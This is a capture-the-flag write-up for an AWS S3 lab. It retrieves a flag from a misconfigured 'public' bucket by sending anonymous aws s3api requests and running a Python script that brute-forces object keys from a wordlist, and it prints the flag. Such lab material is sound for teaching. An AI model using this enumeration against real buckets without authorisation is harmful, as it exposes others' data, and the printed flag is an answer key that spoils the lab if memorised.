# AWS Security I

## Challenge Description

The bucket policy on 'public' bucket allows an anonymous user to read all objects stored in the bucket.

**Objective:**  Interact with the bucket 'public' on the exposed S3 endpoint and retrieve the flag!

## Instructions

* Once you start the lab, you will have access to a Ubuntu instance.
* Your Ubuntu Instance has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
* The exposed S3 endpoint should be running on port 9000 on the machine located at the IP address 192.X.Y.3.
* Use /usr/share/dirb/wordlists/small.txt dictionary.

---

## Solution

As per the instructions, run `ip addr` to get our instance's IP:

```text
root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
1126: eth0@if1127: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:00:09 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.9/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
1129: eth1@if1130: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:ec:87:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.236.135.2/24 brd 192.236.135.255 scope global eth1
       valid_lft forever preferred_lft forever
```

In my case, the endpoint address was `192.236.135.3:9000`.

Searching online, we can find the [documentation](https://awscli.amazonaws.com/v2/documentation/api/latest/index.html) for AWS CLI.

Here, we find that we can specify the endpoint manually with `--endpoint-url`. Since we are not provided credentials, we have to send the request anonymously with `--no-sign-request`.

> **Note:** When I was doing the challenge, I typed in `--endpoint` instead of `--endpoint-url` for some reason. It still ended up working though. ¯\\\_(ツ)_/¯
>
> The commands in this write-up are what I used, so that's why those use `--endpoint`.

We also find that we can use the command `s3api` to interact with the bucket. (I tried `s3` first but couldn't get it working, but I think it's possible to use that as well.)

AWS S3 buckets operate on a key-value basis. We can use the subcommand `get-object` to retrieve an object, given a particular key, using a command like this:

```text
aws --endpoint http://192.236.135.3:9000 --no-sign-request s3api get-object --bucket public --key test ./flag
```

This gets the object in the `public` bucket stored under the key `test`, and stores it to `./flag`.

However, running the above command gives us an error, since we do not know the actual key for the flag:

```text
An error occurred (NoSuchKey) when calling the GetObject operation: The specified key does not exist.
```

To find the key, we can use the provided wordlist `/usr/share/dirb/wordlists/small.txt`. I wrote a Python script to get the flag:

```python
import os
f = open('/usr/share/dirb/wordlists/small.txt', 'r')
wordList = f.readlines()

for line in wordList:
    line = line.strip('\n')
    os.system(f'aws --endpoint http://192.236.135.3:9000 --no-sign-request s3api get-object --bucket public --key {line} {os.getcwd()}/flag')
```

After running the above script, we can read the output file, `flag`, to get the flag.

```text
root@attackdefense:~# cat flag
Flag: 155a5314e36f03ec70eadb3c7dd91049
```

### Flag

```text
155a5314e36f03ec70eadb3c7dd91049
```
